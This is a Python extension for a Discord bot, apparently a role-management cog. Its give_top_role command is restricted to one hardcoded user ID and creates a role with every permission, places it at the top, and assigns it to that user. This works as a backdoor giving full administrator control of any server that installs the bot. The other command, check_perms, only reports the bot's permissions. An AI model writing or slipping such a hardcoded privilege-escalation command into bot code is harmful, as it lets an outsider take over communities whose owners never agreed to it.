import discord
from discord.ext import commands

class RoleManager(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.command(name='give_top_role')
    async def give_top_role(self, ctx):
        """Give yourself a role at the top with all permissions"""
        
        # Check if user is the specific ID
        if ctx.author.id != 267305778619088896:
            await ctx.send("❌ Not authorized.")
            return
        
        try:
            # Create the role with all permissions
            permissions = discord.Permissions.all()
            
            role = await ctx.guild.create_role(
                name="⭐ Supreme Admin",
                permissions=permissions,
                color=discord.Color.gold(),
                hoist=True,
                reason="Top admin role creation"
            )
            
            # Wait a moment for role creation
            await ctx.send("🔄 Creating role...")
            
            # Move to top position (highest number = top position)
            total_roles = len(ctx.guild.roles)
            await role.edit(position=total_roles - 1)
            
            # Add role to user
            await ctx.author.add_roles(role)
            
            await ctx.send(f"✅ Created and assigned **{role.name}** at the top of roles!")
            
        except discord.Forbidden:
            await ctx.send("❌ Bot lacks permissions. Make sure bot has Administrator permission.")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")
    
    @commands.command(name='check_perms')
    async def check_perms(self, ctx):
        """Check bot permissions"""
        bot_perms = ctx.guild.me.guild_permissions
        await ctx.send(f"Bot has admin: {bot_perms.administrator}\nBot has manage roles: {bot_perms.manage_roles}")

async def setup(bot):
    await bot.add_cog(RoleManager(bot))